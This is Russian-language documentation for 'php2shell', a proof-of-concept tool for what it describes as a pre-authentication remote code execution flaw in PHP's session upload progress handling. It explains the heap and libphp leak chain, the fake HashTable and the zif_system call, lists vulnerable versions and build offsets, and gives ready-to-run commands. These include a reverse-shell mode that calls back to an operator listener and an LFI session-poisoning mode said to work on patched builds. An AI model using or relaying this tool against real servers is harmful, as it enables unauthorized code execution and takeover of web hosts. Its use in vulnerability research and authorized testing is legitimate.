# php2shell — документация

[← Назад в README](../README.md)

## Что это

`php2shell` — standalone PoC для CVE-2026-109618 / CVE-2026-109619:
pre-auth RCE в PHP через `session.upload_progress` и нехватку памяти.
Скрипт сам определяет профиль сборки, добывает базу кучи и `libphp`,
строит поддельную `HashTable` и выполняет команду.

Цепочка не требует Docker на цели, записи файлов через веб-приложение или
фиксированных адресов ASLR. Docker нужен только на машине оператора для
режимов `--auto`/`--box`/`--lib`, если ты хочешь автоматически вытащить
смещения из образа или контейнера.

## Проверенные версии

| Версия | Результат |
|---|---|
| PHP 8.4.26 | `uid=33(www-data)` |
| PHP 8.5.11 | `uid=33(www-data)` |
| PHP 8.4.27 | negative: утечка кучи не срабатывает |
| PHP 8.5.12 | исправлено |
| PHP 8.2.35 / 8.3.36 | исправлено |

По данным публичного исследования уязвимы PHP 5.4+. Профили этого PoC
откалиброваны под 8.4 и 8.5; для другой сборки используй `--auto`,
`--lib` или ручные `--zif/--dtor/--ht`.

## Требования

- Python 3.10+; сторонних Python-пакетов нет.
- На цели включён `session.upload_progress.enabled=On`.
- Для core-RCE: `display_errors=On`, `memory_limit` меньше OOM-поля,
  `post_max_size` больше него, желательно один worker.
- Для вывода команды и shell: `bash`, `base64`, `sh` на цели; сеть от
  цели до `--lhost`; `session.save_path` лучше `/tmp`.
- Для `shell`: `session.use_strict_mode=0` и `--sid` из одного символа,
  чтобы команда `sh</tmp/sess_a` влезла в 14 байт.
- Для `lfi`: `include()`/`require()` sink,
  `session.upload_progress.cleanup=Off`, известный `save_path`.
- Для `--auto`/`--box`: Docker на машине оператора; цель может быть
  удалённой.

## Быстрый старт

```bash
python3 php2shell.py -u http://TARGET/index.php -c 'id'
```

По умолчанию включён режим `rce`: профиль, утечки, запись команды,
выполнение и сбор вывода. Если цель удалённая — укажи свой адрес:

```bash
python3 php2shell.py -u http://TARGET/index.php -c 'id' \
  -L 192.168.1.10 -P 4444
```

## Режимы

| Режим | Назначение |
|---|---|
| `rce` | полная цепочка и вывод команды |
| `leak` | только heap/libphp leak, без RCE |
| `trigger` | только OOM + утечка 4096 байт в `Set-Cookie` |
| `shell` | reverse shell через `/tmp/sess_a` |
| `lfi` | app-assisted session poisoning + LFI, работает и на патче |

## Все флаги

### Основные

| Флаг | Что делает |
|---|---|
| `-u, --url` | адрес цели |
| `-c, --cmd` | команда; по умолчанию `id` |
| `-m, --mode` | `rce`, `leak`, `trigger`, `shell`, `lfi` |
| `-p, --profile` | `auto`, `84`, `85`, `lab` (также `bookworm`, `8511`) |
| `-a, --auto` | авто-контейнер, память, смещения, proof |
| `-L, --lhost` | адрес для вывода/shell |
| `-P, --lport` | порт; `0` — свободный |
| `-n, --no-listen` | не поднимать listener, использовать свой `nc` |
| `-s, --save` | путь сессий; по умолчанию `/tmp` |
| `-S, --sid` | id сессии; по умолчанию `a` |
| `-x, --sink` | include()-sink для `lfi` |
| `-r, --retries` | попытки на этап; по умолчанию `3` |
| `-t, --timeout` | таймаут запроса; по умолчанию `30` |
| `-e, --sep` | разделитель Content-Type: `semi`, `comma`, `space` |
| `-j, --json` | машинный вывод |
| `-q, --quiet` | только результат |
| `--plain` | без цветов |
| `-v, --version` | версия |
| `--list` | профили и смещения |
| `-h, --help` | справка |

### Смещения и стенд

| Флаг | Что делает |
|---|---|
| `-b, --box, --docker-container` | локальный контейнер с целью |
| `-l, --lib` | локальный `libphp.so` для смещений |
| `--zif, --zif-offset` | смещение `zif_system` |
| `--dtor, --dtor-offset` | смещение `zval_ptr_dtor` |
| `--ht, --htdata-offset` | смещение fake HashTable в куче |
| `--huge, --huge-megabytes` | размер OOM-поля |
| `--auto-container` | найти контейнер по порту |
| `--auto-huge` | подобрать OOM-поле по `memory_limit` |
| `--auto-offsets` | смещения из официального образа |
| `--auto-proof` | найти proof-путь через `/out` |

### Проверка результата

| Флаг | Что делает |
|---|---|
| `-F, --proof, --proof-file` | файл, который пишет команда |
| `-f, --fetch` | GET-запрос после выстрела |
| `-k, --mark, --marker` | обязательная строка в ответе |
| `-B, --blind` | один выстрел без сбора вывода |
| `-o, --overwrite` | разрешить перезапись proof/дампа |
| `-d, --dump, --dump-cookie` | сохранить утечку |
| `--leak-only` | остановиться после утечек |
| `--trigger-only` | только trigger |

## Профили и смещения

`--profile` выбирает раскладку heap и относительные символы:

- `84` — PHP 8.4.x, `htdata=0x690d8`, OOM 12 MB;
- `85` — PHP 8.5.x, `htdata=0x7e0d8`, OOM 24 MB;
- `lab` — самосборный стенд;
- `auto` — определить по `X-Powered-By`/контейнеру.

ASLR не хардкодится: chunk base и libphp base добываются утечками.
Относительные смещения сборки остаются фиксированными.

## Как это работает

1. `session.upload_progress` создаёт большую multipart-загрузку и доводит
   worker до OOM.
2. Ошибка отдаёт наружу указатели кучи; вторая утечка даёт базу `libphp`.
3. Из сессии собирается fake `HashTable`/zval; при shutdown срабатывает
   `zval_ptr_dtor` на подконтрольном указателе.
4. Выполняется `zif_system`, команда берётся из session-файла.
5. Короткий carrier `sh</tmp/sess_a` (14 байт) запускает `sh`; длинная
   пользовательская команда лежит в session-файле в base64.
6. В режиме `lfi` приложение само подключает session-файл через sink —
   это не memory corruption, поэтому режим работает и на патче.

## Примеры

```bash
# базовый RCE
python3 php2shell.py -u http://127.0.0.1:18080/index.php -c 'id'

# авто + proof
python3 php2shell.py -u http://127.0.0.1:18080/index.php --auto \
  -c 'id>/out/p1' -F proof.txt -k 'uid='

# только утечки
python3 php2shell.py -u http://127.0.0.1:18080/index.php -m leak

# только trigger
python3 php2shell.py -u http://127.0.0.1:18080/index.php -m trigger

# reverse shell со своим listener
python3 php2shell.py -u http://127.0.0.1:18080/index.php \
  -m shell -L 192.168.1.10 -P 4444

# свой nc: PoC только seed'ит файл
nc -lvnp 4444
python3 php2shell.py -u http://127.0.0.1:18080/index.php \
  -m shell -n -L 192.168.1.10 -P 4444

# LFI
python3 php2shell.py -u http://127.0.0.1:18080/index.php \
  -m lfi -x '/index.php?page=' -c id -k 'uid='

# машинный вывод
python3 php2shell.py -u http://127.0.0.1:18080/index.php -c id -j
```

## Ограничения

- Core-RCE требует mod_php (или подходящий SAPI), `display_errors=On`,
  `memory_limit` меньше OOM-поля, `post_max_size` больше него.
- Стабильность 100% зависит от раскладки и одного worker; при нескольких
  worker'ах возможны промахи.
- Лимит 14 байт относится только к carrier `sh</tmp/sess_a`; длинная
  команда кодируется в session-файл.
- Reverse shell требует `save_path` с коротким путём, `use_strict_mode=0`,
  `bash` и сетевой доступ от цели до listener'а.
- 8.5-профиль откалиброван на официальном образе; другой build требует
  своей раскладки/`--lib`.
- Docker-тег `php:<version>-apache` может измениться; для повторяемости
  пинь digest или передавай `--lib`.
- `lfi` — отдельный сценарий, а не core-RCE; ему нужен sink в приложении.

## Troubleshooting

| Симптом | Что проверить |
|---|---|
| `утечка кучи` | `display_errors=On`, `memory_limit` < OOM, один worker, версия не патчена, профиль |
| `утечка libphp` | профиль/смещения, `--auto`, `--lib`, другой build |
| команда выполняется, вывода нет | `-L` доступен с цели, firewall, `save_path`, `bash`/`base64` |
| `путь сессии слишком длинный` | короткий `save_path` (`/tmp`), `--sid` из одного символа |
| `lfi` не находит payload | `cleanup=Off`, правильный `--sink`, `--mark`, известный `save_path` |
| `--auto` падает | Docker-права, образ, сеть; задай `-p`, `--lib`, `--zif/--dtor/--ht` вручную |
| 8.4.27/8.5.12 | negative control: это исправленные версии |

## Этика

Инструмент предназначен только для своих систем и авторизованного
тестирования. Не выкладывай чужие адреса, токены, session-файлы и данные
из дампов памяти. Автор не отвечает за применение вне разрешённого
периметра.

## Канал

[Walter White (Lamer)](https://t.me/walterlamer) · `@walterlamer`
